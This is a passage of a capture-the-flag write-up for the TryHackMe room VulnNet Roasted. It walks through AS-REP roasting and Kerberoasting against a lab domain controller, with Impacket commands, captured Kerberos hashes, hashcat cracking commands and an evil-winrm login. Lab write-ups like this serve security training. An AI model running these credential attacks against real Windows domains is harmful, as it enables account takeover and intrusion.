# :game_die: THM Writeup: VulnNet Roasted. In this article, I step through the…

> **Original Source:** [THM Writeup: VulnNet Roasted. In this article, I step through the…](https://infosecwriteups.com/thm-writeup-vulnnet-roasted-8f4e18314ca7)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

## Kerberos Exploitation


Now that I have some potential usernames, I started looking for ways to discover credentials for these accounts. In our NMAP scans from earlier, I saw that Kerberos was running on port 88 and since the room’s title heavily hints towards kerberoasting, I figured this was a good place to start.


```
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-03 10:33:32Z)
```


### ASREPRoasting


ASReproasting occurs when a user account has the privilege “*Does not require Pre-Authentication*” set. This means that the account does not not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.


## Get Hacktivities’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


We can retrieve Kerberos tickets using a tool called “GetNPUsers.py” in [Impacket](https://github.com/SecureAuthCorp/impacket). This allows us to query ASREProastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames, which we enumerated previously during our SMB enumeration.


```
python3 GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.222.122 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
```


After running “GetNPUsers.py”, I can see that you can query a ticket with no password from the t-skid user account.


```
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:6ba0665d5efd839cae9593ef6825e36a$1e89ab87b72c3f1ac5e979b26f7b71bef98bef016ae7087758edb0b7fee96c2d1e02c1cc2565713476b955b085f6cbfb96ee7229e0ba6343ffda44d615af7a1768f59e07d77b957f68f3da1a07fcd3a874f2518123691524f3be3fa195b8e1428bdc4322c152c342ba8b7de80d455ba53f611e132dae11ad5833db482d8526ddeb5ac09533391f7b3828bdfd90f8447278618dcabfe64a15d0a708547f46537df8632e603b214e3e4f038a4929283b35742f88af89f13615e7cedfd1b83ea73ecb95a41f6c4edf32fbae23eaaf5c018efcc694393272c1f04a835551b0b358344b0564b702971ac298e76fa2c7a7f21add1cd13f48b7
```


Next, we can use hashcat to crack the “*Kerberos 5 AS-REP type 23*” hash retrieved from the KDC.


```
hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt -o cracked.txt<hash>:tj07*
```


### Kerberoasting


Now that I have a set of standard user credentials, I started looking for supported Service Principal Name’s (SPN’s) and get Ticket Granting Service (TGS) for the SPN using “GetUserSPNs” tool from Impacket.


```
python3 GetUserSPNs.py vulnnet-rst.local/t-skid:tj0* -dc-ip 10.10.5.146 -request
```


This was successful and I was able to retrieve the TGS hash for the user enterprise-core-vn.


```
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$6abf4cc44a39bdcd4105132ce2de79e2$94ceaec59d8fd2d6fc7e78163f5dec76f9d3d7d36f3ba72611c13023d17b1f58beb790bd1b8059235768103a637044b078084ccec48d415bf4c663bfd149f30f83e0478dbfa3c9533bca86bdb904fc8241fa66afd97f377c5e2e0113db73e2717435076243a9474c8b417b888d0de8eaa945119c9fa3613391b3ecf4226c1e94daadaa14dadfc3aae24047f1a828ef853322cec2b40afc43afc0f17832512ac671575525e95af19c1a7fae625f1c1be49caa84f927c84a39464387cb448caa738a75ac31a2c29f912faeaefa2091daf9182eb8551f06dc5160df89dd445e9c74127070827233af07d58df6a759727ccef8b8acb9982af7857d262f768dc330e4eea21e9e1c575ba90a7dca7d4be17fdc8c1c1c9d3603d877b022887e483f63538f5b794d32c4e7708fa8ed8b35e2aae0fd0f762acd690d44be1b142507142fa654aeda87906bdfc8ba6b81dbe6dc1be8d1331ea178e3a5f739eb2eb35207f946c91471e7a75c11616029b85d36ad2ed9c6135090bcb32416b81da0305bfa9c8a905c29a6ca3759ede8f96f18be22652d287b64ce6d7447b75d63136511c913930b9e1962cede06fde63001a7b70e3d16909a429a73c30f5e751c99c1d17a4521ac5aa1eaffa6746de8accb8312996689b86cfb94a898d066602e68512f865229511549eb30dbac994b543e1977b9105d19e0fef3982c4d7a71ae86d69429c9c19f2f330140cdf30e5231a82537626879950f988a074572c9273b2117c0c4497cab2f97b72aef6ef05658b9968bfffb91c21a7245e1a3b80f40f7177acd5d1062bc62d21c2874f62bd3cb4e48226037941c354a0017cec4434de5ccfd0791eed3fd4ed20f8e64c4b702bbb32526cf110e9f62a77c51d7f0607b9634b6b468fd864de6e440ae88d00b6c0381f1df8d17c53493ac66234e0f2195f83883e0bd015e0e26d324881c8674cdc7cf5e9c8ae72a95ff1fc72ddb4a14bbea1cd378c234350c97b638cd2e048f0b6c90df243d0fb3f9837d7baab629be6e6151a2c5bb366efb672b13884d071be58233768f4bf37bab374691af67cf0de44b92a182f5676e41ec44c56bb69419205523aad19cc9e5eae7401bebb2d694314d6118ef0fafde6c44c9e92c590e897bd8788cff0cf5b2184bcb284a7b78be8800fc46274296c1824c6a83da9f4e50f5f7f678a732d6ba3a55e14cad912ca53aa25eb9f3f327a1d4c22dccf26f37b9cc221fae2f36e3eba0722cf07570384fcb721b6762e6c7603ac0861755a59e5e52e2714fc0d9270e88e7c9629db8ae7027f8b23c0650d725d4153b5eb32395f1f56afad711bf691740ff5b554648a0553d2c66474b53129f7f26a581c4f339bb079f7770c5c3ced0f3f4615f3a535b81e26c26f385
```


I can now use hashcat to retrieve the password for this user account.


```
hashcat64.exe -m 13100 hash.txt rockyou.txt
```


*Kerberos TGS Hash Password.*


With this new set of credentials, I was able to use evil-winrm to login and retrieve the user flag.


```
evil-winrm -u 'enterprise-core-vn' -p '*' -i 10.10.128.52 -N
```


*User Flag.*

---

*Originally published on [Medium](https://infosecwriteups.com/thm-writeup-vulnnet-roasted-8f4e18314ca7). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
